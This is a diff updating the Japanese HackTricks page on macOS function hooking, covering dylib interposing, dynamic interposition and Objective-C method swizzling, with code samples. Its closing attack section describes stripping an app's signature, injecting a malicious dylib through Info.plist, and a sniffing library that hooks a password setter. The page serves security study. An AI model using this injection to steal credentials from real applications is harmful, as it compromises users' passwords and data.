@@ -1,28 +1,30 @@
-# macOS Function Hooking
+# macOS関数フック
 
 <details>
 
 <summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>
 
-HackTricksをサポートする他の方法：
+HackTricksをサポートする他の方法:
 
-* **HackTricksで企業を宣伝したい**か**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
-* **💬** [**Discordグループ**](https://discord.gg/hRep4RUj7f)**または**[**Telegramグループ**](https://t.me/peass)**に参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)を**フォロー**する。
-* **ハッキングトリックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**
+- **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+- [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
+- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
+- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**または[telegramグループ](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)で**フォロー**する。
+- **ハッキングテクニックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**
 
 </details>
 
 ## 関数インターポージング
 
-**`__interpose`セクション（または`S_INTERPOSING`フラグが付いたセクション）を含む関数ポインタ**のタプルを持つ**dylib**を作成し、**元の**関数と**置換**関数を参照します。
+**`__interpose` (`__DATA___interpose`)** セクション（または **`S_INTERPOSING`** フラグが付いたセクション）を含む **関数ポインタ** のタプルを持つ **dylib** を作成し、**元の**関数と**置換**関数を参照します。
 
-その後、**`DYLD_INSERT_LIBRARIES`でdylibをインジェクト**します（インターポージングはメインアプリがロードされる前に発生する必要があります）。明らかに、[**`DYLD_INSERT_LIBRARIES`の使用に適用される制限**はここでも適用されます](macos-library-injection/#check-restrictions)。
+その後、**`DYLD_INSERT_LIBRARIES`** でdylibを**インジェクト**します（インターポージングはメインアプリがロードされる前に発生する必要があります）。明らかに、**`DYLD_INSERT_LIBRARIES`** の使用に適用される[**制限事項**もここに適用されます](macos-library-injection/#check-restrictions)。
 
 ### printfをインターポース
 
-{% code title="interpose.c" %}
+{% tabs %}
+{% tab title="interpose.c" %}
+{% code title="interpose.c" overflow="wrap" %}
 ```c
 // gcc -dynamiclib interpose.c -o interpose.dylib
 #include <stdio.h>
@@ -42,7 +44,9 @@ __attribute__((used)) static struct { const void *replacement; const void *repla
 __attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
 ```
 {% endcode %}
+{% endtab %}
 
+{% tab title="hello.c" %}
 ```c
 //gcc hello.c -o hello
 #include <stdio.h>
@@ -52,40 +56,10 @@ printf("Hello World!\n");
 return 0;
 }
 ```
+{% endtab %}
 
-#### macOS Function Hooking
-
-macOS provides a feature called Interpose, which allows you to intercept and replace functions in shared libraries. This can be used for various purposes, including debugging, logging, and even modifying the behavior of applications.
-
-To use Interpose, you need to create a new shared library that contains the replacement functions. Then, you can use the `DYLD_INSERT_LIBRARIES` environment variable to load your library into the target process and intercept the desired functions.
-
-Here is an example of using Interpose to hook the `open` function:
-
-```c
-#define _DARWIN_C_SOURCE
-#include <stdio.h>
-#include <dlfcn.h>
-
-int (*original_open)(const char *path, int oflag, ...);
-
-int my_open(const char *path, int oflag, ...) {
-    // Your custom implementation here
-}
-
-__attribute__((constructor))
-void init() {
-    original_open = dlsym(RTLD_NEXT, "open");
-    if (original_open == NULL) {
-        fprintf(stderr, "Error hooking open\n");
-    }
-    printf("Hooked open function\n");
-}
-```
-
-In this example, the `init` function is called when the library is loaded into the process. It uses `dlsym` to get a reference to the original `open` function, which is then replaced with `my_open`. This allows you to intercept and modify the behavior of the `open` function.
-
-Remember that function hooking can be a powerful technique, but it should be used responsibly and ethically. Improper use of function hooking can lead to instability and security vulnerabilities in the target system.
-
+{% tab title="interpose2.c" %}
+{% code overflow="wrap" %}
 ```c
 // Just another way to define an interpose
 // gcc -dynamiclib interpose2.c -o interpose2.dylib
@@ -109,7 +83,9 @@ return ret;
 
 DYLD_INTERPOSE(my_printf,printf);
 ```
-
+{% endcode %}
+{% endtab %}
+{% endtabs %}
 ```bash
 DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
 Hello from interpose
@@ -117,8 +93,26 @@ Hello from interpose
 DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
 Hello from interpose
 ```
+{% hint style="warning" %}
+**`DYLD_PRINT_INTERPOSTING`** 環境変数は、インターポージングのデバッグに使用でき、インターポースプロセスを出力します。
+{% endhint %}
 
-## メソッドスウィズリング
+また、**インターポージングはプロセスとロードされたライブラリの間で発生**することに注意してください。共有ライブラリキャッシュでは機能しません。
+
+### ダイナミックインターポージング
+
+今では、**`dyld_dynamic_interpose`** 関数を使用して、関数を動的にインターポースすることも可能です。これにより、ランタイムで関数をプログラム的にインターポースすることができ、最初からのみ行うのではなくなります。
+
+**置き換える関数と置き換える関数のタプル**を指定するだけです。
+```c
+struct dyld_interpose_tuple {
+const void* replacement;
+const void* replacee;
+};
+extern void dyld_dynamic_interpose(const struct mach_header* mh,
+const struct dyld_interpose_tuple array[], size_t count);
+```
+## メソッドスイズリング
 
 ObjectiveCでは、メソッドは次のように呼び出されます: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**
 
@@ -129,13 +123,14 @@ ObjectiveCでは、メソッドは次のように呼び出されます: **`[myCl
 オブジェクト構造に従って、メソッドの **名前** と **メソッドコードへのポインタ** が **格納**されている **メソッドの配列** にアクセスすることができます。
 
 {% hint style="danger" %}
-メソッドやクラスは名前に基づいてアクセスされるため、この情報はバイナリに保存されているため、`otool -ov </path/bin>` または [`class-dump </path/bin>`](https://github.com/nygard/class-dump) を使用して取得することができます。
+メソッドやクラスは名前に基づいてアクセスされるため、この情報はバイナリに保存されているため、`otool -ov </path/bin>` または [`class-dump </path/bin>`](https://github.com/nygard/class-dump) を使用して取得することが可能です。
 {% endhint %}
 
-### 生のメソッドへのアクセス
+### 生のメソッドにアクセスする
 
-次の例のように、メソッドの情報（名前、パラメータ数、アドレスなど）にアクセスすることができます。
+次の例のように、メソッドの情報（名前、パラメータ数、アドレスなど）にアクセスすることができます:
 
+{% code overflow="wrap" %}
 ```objectivec
 // gcc -framework Foundation test.m -o test
 
@@ -201,15 +196,15 @@ NSLog(@"Uppercase string: %@", uppercaseString3);
 return 0;
 }
 ```
+### method_exchangeImplementationsを使用したメソッドのスイズリング
 
-### method\_exchangeImplementationsを使用したメソッドスイズリング
-
-関数\*\*`method_exchangeImplementations`\*\*は、**1つの関数の実装のアドレスを他の関数に変更**することを可能にします。
+関数**`method_exchangeImplementations`**は、**1つの関数の実装のアドレスを他の関数に変更**することを可能にします。
 
 {% hint style="danger" %}
-したがって、関数が呼び出されるときには、**実行されるのは他の関数**です。
+したがって、関数が呼び出されると**実行されるのは他の関数**です。
 {% endhint %}
 
+{% code overflow="wrap" %}
 ```objectivec
 //gcc -framework Foundation swizzle_str.m -o swizzle_str
 
@@ -253,19 +248,21 @@ NSLog(@"Substring: %@", subString);
 return 0;
 }
 ```
+{% endcode %}
 
 {% hint style="warning" %}
-この場合、**正規**メソッドの**実装コード**が**メソッド名**を**検証**すると、このスウィズリングを**検出**して実行を防ぐことができます。
+この場合、**正規**メソッドの**実装コード**が**メソッド** **名**を**検証**すると、このスイズリングを**検出**して実行を防ぐことができます。
 
 次のテクニックにはこの制限がありません。
 {% endhint %}
 
-### method\_setImplementationを使用したメソッドスウィズリング
+### method\_setImplementationを使用したメソッドスイズリング
 
-前の形式は奇妙です。なぜなら、1つのメソッドの実装をもう1つのメソッドに変更しているからです。**`method_setImplementation`** 関数を使用すると、1つのメソッドの**実装**を**他のメソッド**に変更できます。
+前の形式は奇妙です。なぜなら、2つのメソッドの実装を変更しているからです。**`method_setImplementation`** 関数を使用すると、**1つのメソッドの実装を他のメソッドに変更**できます。
 
-新しい実装から呼び出す場合は、後でそのアドレスを特定するのが難しくなるため、**元の実装のアドレスを保存**してから上書きすることを忘れないでください。
+新しい実装から呼び出す場合は、**元の実装のアドレスを保存**しておくことを忘れないでください。後でそのアドレスを見つけるのが複雑になるためです。
 
+{% code overflow="wrap" %}
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <objc/runtime.h>
@@ -317,19 +314,19 @@ return 0;
 }
 }
 ```
+{% endcode %}
 
 ## フック攻撃方法論
 
-このページでは、関数をフックするさまざまな方法について説明しました。ただし、これらは**プロセス内でコードを実行して攻撃する**というものでした。
+このページでは、関数をフックするさまざまな方法について説明されています。ただし、これらは**プロセス内でコードを実行して攻撃する**というものでした。
 
-そのためには、最も簡単な技術としては、[Dyldを環境変数またはハイジャックを介して注入する](macos-library-injection/macos-dyld-hijacking-and-dyld\_insert\_libraries.md)という方法があります。ただし、[Dylibプロセスインジェクション](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port)を介して行うこともできると思われます。
+そのためには、最も簡単な技術としては、[Dyldを環境変数またはハイジャックを介して注入する](macos-library-injection/macos-dyld-hijacking-and-dyld\_insert\_libraries.md)ことができます。ただし、[Dylibプロセスインジェクション](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port)を介して行うこともできると思われます。
 
-ただし、これらのオプションは**保護されていない**バイナリ/プロセスに**限定**されています。制限について詳しく知るには、各技術を確認してください。
+ただし、これらのオプションは**保護されていない**バイナリ/プロセスに**限定**されています。制限事項について詳しく知るには、各技術を確認してください。
 
-ただし、関数フック攻撃は非常に特定されたものであり、攻撃者はこれを行って**プロセス内の機密情報を盗み出す**ことを意図しています（そうでなければプロセスインジェクション攻撃を行うでしょう）。そして、この機密情報はMacPassなどのユーザーがダウンロードしたアプリケーション内に存在する可能性があります。
+ただし、関数フック攻撃は非常に特定されたものであり、攻撃者はこれを行って**プロセス内の機密情報を盗み出す**ために行います（そうでなければプロセスインジェクション攻撃を行うでしょう）。そして、この機密情報はMacPassなどのユーザーがダウンロードしたアプリケーションに存在する可能性があります。
 
-したがって、攻撃者の手法は、脆弱性を見つけるか、アプリケーションの署名を削除し、Info.plistを介して\*\*`DYLD_INSERT_LIBRARIES`\*\*環境変数を注入することです。以下のようなものを追加します：
-
+したがって、攻撃者の手法は、脆弱性を見つけるか、アプリケーションの署名を削除し、Info.plistを介して**`DYLD_INSERT_LIBRARIES`**環境変数を注入することです。例えば、次のように追加します：
 ```xml
 <key>LSEnvironment</key>
 <dict>
@@ -337,7 +334,6 @@ return 0;
 <string>/Applications/Application.app/Contents/malicious.dylib</string>
 </dict>
 ```
-
 そしてアプリケーションを**再登録**してください：
 
 {% code overflow="wrap" %}
@@ -349,11 +345,12 @@ return 0;
 そのライブラリに、情報を外部に送信するフックコードを追加します：パスワード、メッセージ...
 
 {% hint style="danger" %}
-新しいバージョンのmacOSでは、アプリケーションバイナリの署名を**削除**し、それが以前に実行されていた場合、macOSはもはやそのアプリケーションを実行しなくなります。
+新しいバージョンの macOS では、アプリケーションバイナリの署名を**削除**した場合、それが以前に実行されていた場合、macOS はもはやそのアプリケーションを実行しなくなります。
 {% endhint %}
 
 #### ライブラリの例
 
+{% code overflow="wrap" %}
 ```objectivec
 // gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib
 
@@ -389,6 +386,7 @@ IMP fake_IMP = (IMP)custom_setPassword;
 real_setPassword = method_setImplementation(real_Method, fake_IMP);
 }
 ```
+{% endcode %}
 
 ## 参考
 
@@ -396,14 +394,14 @@ real_setPassword = method_setImplementation(real_Method, fake_IMP);
 
 <details>
 
-<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
+<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>を通じてゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>
 
 HackTricks をサポートする他の方法:
 
-* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい場合は** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
+* **HackTricks で企業を宣伝したい**または **HackTricks をPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
 * [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見つける
-* **💬** [**Discordグループ**](https://discord.gg/hRep4RUj7f) に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 で **@carlospolopm** をフォローする
-* **ハッキングトリックを共有するために** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリにPRを提出する
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見る
+* **💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) に参加するか、[**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live) をフォローする。
+* **ハッキングトリックを共有するには、** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の GitHub リポジトリに PR を提出してください。
 
 </details>
